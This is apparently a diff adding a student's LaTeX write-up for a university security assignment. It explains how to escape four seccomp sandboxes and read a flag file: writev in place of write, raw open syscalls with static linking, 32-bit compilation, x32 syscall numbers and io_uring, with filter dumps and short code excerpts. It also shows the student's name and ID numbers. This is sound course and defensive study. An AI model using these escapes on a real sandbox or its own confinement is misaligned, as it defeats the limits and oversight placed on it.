@@ -1,0 +1,187 @@
+\documentclass[11pt]{article}
+\usepackage[margin=1in]{geometry}
+\usepackage{courier}
+\usepackage{listings}
+\usepackage{xcolor}
+
+\lstset{
+  basicstyle=\footnotesize\ttfamily,
+  columns=fullflexible,
+  breaklines=true,
+  numbers=left,
+  numberstyle=\tiny,
+  stepnumber=1,
+  frame=single,
+  showstringspaces=false
+}
+\setlength{\parindent}{0pt}
+
+\begin{document}
+
+\title{CS453/698 Assignment 3 Write-Up}
+\author{Jiaze Xiao \\ WatIAM User ID: j76xiao \\ student number: 20933691}
+\date{\today}
+\maketitle
+
+\section{Introduction}
+This assignment involves creating four exploit programs (\texttt{sploit1.c}, \texttt{sploit2.c},
+\texttt{sploit3.c}, and \texttt{sploit4.c}) to bypass four different sandbox executables (\texttt{sandbox1},
+\texttt{sandbox2}, \texttt{sandbox3}, \texttt{sandbox4}), each of which imposes its own \texttt{seccomp}
+filter. The goal is to read the contents of the file named \texttt{flag} and write them to \texttt{stdout} despite
+the various system call restrictions in place.
+
+\section{Sandbox1 and \texttt{sploit1.c}}
+
+\subsection{Sandbox1 Seccomp Filter}
+\begin{lstlisting}[language=bash]
+$ seccomp-tools dump -c ./sandbox1
+
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
+ 0005: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0008
+ 0006: 0x15 0x01 0x00 0x00000010  if (A == ioctl) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x06 0x00 0x00 0x00000000  return KILL
+\end{lstlisting}
+
+From the above, we see that \texttt{write} (syscall number 1) is specifically blocked. However,
+\texttt{writev} (syscall number 20 on most 64-bit Linux systems) is not blocked, and nor is \texttt{read}.
+Hence, we can open the \texttt{flag} file with \texttt{open}, read it, and use \texttt{writev} to write the
+flag to \texttt{stdout}.
+
+\subsection{\texttt{sploit1.c}}
+\begin{lstlisting}[language=C]
+...
+int main() {
+    struct iovec iov[1];
+...
+    iov[0].iov_base = flag;
+    iov[0].iov_len  = len;
+    // Use writev instead of write
+    writev(STDOUT_FILENO, iov, 1);
+    return 0;
+}
+\end{lstlisting}
+This bypasses the \texttt{write} restriction by calling \texttt{writev}.
+
+\section{Sandbox2 and \texttt{sploit2.c}}
+
+\subsection{Sandbox2 Seccomp Filter}
+\begin{lstlisting}[language=bash]
+$ seccomp-tools dump -c ./sandbox2
+...
+ 0007: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0027
+ ...
+\end{lstlisting}
+
+In \texttt{sandbox2}, \texttt{open} is allowed, but many related calls are not (such as \texttt{openat}).
+Moreover, dynamic linking itself can invoke additional syscalls (e.g., \texttt{openat} inside the
+dynamic loader), so compiling our exploit statically (\texttt{-static}) to ensure we do not violate the filter. Otherwise, even an empty main program will violate the filter.
+
+\subsection{\texttt{sploit2.c}}
+Explicitly calls syscall \texttt{open}:
+\begin{lstlisting}[language=C]
+...
+    // Call open with the SYS_open syscall number
+    // to avoid the library's open() which may call openat.
+    int fd = syscall(SYS_open, "./flag", O_RDONLY, 0);
+...
+\end{lstlisting}
+
+Using \texttt{-static} ensures that no dynamic loader calls will occur. In the \texttt{Makefile}:
+\begin{lstlisting}
+CFLAGS = -Wall -ggdb -static
+...
+\end{lstlisting}
+This way, we avoid any hidden \texttt{openat} or other forbidden system calls.
+
+
+\section{Sandbox3 and \texttt{sploit3.c}}
+
+\subsection{Sandbox3 Seccomp Filter}
+\begin{lstlisting}[language=bash]
+$ seccomp-tools dump -c ./sandbox3
+
+line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
+...
+ 0005: 0x15 0x14 0x00 0x00000001  if (A == write) goto 0026
+ 0006: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0026
+ 0007: 0x15 0x12 0x00 0x00000010  if (A == ioctl) goto 0026
+ ...
+ 0024: 0x15 0x00 0x01 0x40000003  if (A != ARCH_I386) goto 0026
+ 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0026: 0x06 0x00 0x00 0x00000000  return KILL
+\end{lstlisting}
+
+Here, we see that \texttt{write}, \texttt{open}, and a whole bunch of other calls are blocked. This is
+somewhat stricter than \texttt{sandbox1}. However, 32-bit mode can bypass the filter because of how \texttt{ARCH\_I386} is handled in the BPF code. The filter specifically checks \texttt{A = arch} for \texttt{ARCH\_X86\_64} and only applies its deny rules in that case. If we compile \texttt{sploit3.c} as a 32-bit binary (by passing \texttt{-m32} to \texttt{gcc}), the system calls it issues match \texttt{ARCH\_I386} instead of \texttt{ARCH\_X86\_64}, and the sandbox effectively permits those calls under the ``\texttt{return ALLOW}'' branch in the BPF.
+
+\subsection{\texttt{sploit3.c}}
+\texttt{sploit3.c} only completes a normal \texttt{open}, \texttt{read} and \texttt{write} flow, but in the \texttt{Makefile}, we do:
+\begin{lstlisting}
+sploit3: sploit3.c
+    $(CC) $(CFLAGS) -m32 $< -o $@
+\end{lstlisting}
+so it compiles for 32-bit \texttt{i386}, thus escaping the filter that only kills certain syscalls under \texttt{ARCH\_X86\_64}.
+
+\section{Sandbox4 and \texttt{sploit4.c}}
+
+\subsection{Sandbox4 Seccomp Filter}
+\begin{lstlisting}[language=bash]
+$ seccomp-tools dump -c ./sandbox4
+...
+ 0003: 0x15 0x13 0x00 0x00000001  if (A == write) goto 0023
+ 0004: 0x15 0x12 0x00 0x00000002  if (A == open) goto 0023
+ ...
+ 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0023: 0x06 0x00 0x00 0x00000000  return KILL
+\end{lstlisting}
+
+Interestingly, \texttt{write}, \texttt{open} and almost all writing syscalls are blocked under \texttt{ARCH\_X86\_64}, but the filter
+does not appear to catch \texttt{x32} syscalls (check if \texttt{A < 0x40000000}), which can be made by passing a special bit in the syscall number. That means we can do:
+\[
+    \texttt{syscall(0x40000000 | SYS\_write, STDOUT\_FILENO, \ldots)}
+\]
+to invoke the \texttt{x32} version of \texttt{write}, effectively bypassing the filter's checks on the
+\texttt{ARCH\_X86\_64} syscall table.
+
+\subsection{\texttt{sploit4.c}}
+\begin{lstlisting}[language=C]
+...
+#define X32 0x40000000
+...
+    // Bypass by calling x32 sys_write
+    long w = syscall(X32 | SYS_write, 1, flag, n);
+...
+\end{lstlisting}
+Using a \texttt{x32} syscall \texttt{write} to bypass the filter.
+
+\section{Appendix: \texttt{io\_uring} Bypasses}
+\label{sec:io_uring}
+
+When exploring the filters for \texttt{sandbox4}, I found that the
+\texttt{io\_uring} syscalls (\texttt{SYS\_io\_uring\_setup}, \texttt{SYS\_io\_uring\_enter}, etc.) are not
+blocked. As a result, it is possible to open and read the \texttt{flag} file, then submit a \texttt{write} request
+via \texttt{io\_uring} to \texttt{STDOUT} and bypass the filter. This can be done either by manually mapping
+the ring in user space (\texttt{sploitA.c}) or by using the \texttt{liburing} library (\texttt{sploitB.c}).
+I asked on Piazza whether \texttt{io\_uring} would be allowed; the instructor clarified that it was not
+the intended approach to break \texttt{sandbox4}, but it was indeed missed in the filter.
+
+For completeness, here are the main points:
+\begin{itemize}
+    \item \texttt{sploitA.c} manually calls \texttt{SYS\_io\_uring\_setup} and \texttt{SYS\_io\_uring\_enter}
+          and crafts the ring buffers manually.
+    \item \texttt{sploitB.c} uses \texttt{liburing} to do the same thing more succinctly although it's not supported on grading platform.
+\end{itemize}
+Those solutions also successfully bypass \texttt{sandbox1}, \texttt{sandbox3}, and \texttt{sandbox4}, but
+they are not the intended solutions for the assignment.
+
+\end{document}
